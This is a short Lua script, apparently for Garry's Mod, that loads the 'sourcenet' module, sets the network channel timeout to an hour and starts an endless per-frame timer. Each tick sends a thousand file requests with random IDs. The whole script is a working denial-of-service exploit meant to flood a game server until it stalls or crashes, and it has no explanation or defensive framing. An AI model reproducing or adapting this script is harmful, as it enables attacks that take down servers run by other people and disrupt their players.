require("sourcenet")
local netchan = CNetChan()
netchan:SetTimeout(3600,false)
timer.Create("daun",0,0,function()
for i=1,1000 do
netchan:RequestFile(1, math.random(1,500000000))
end
end)
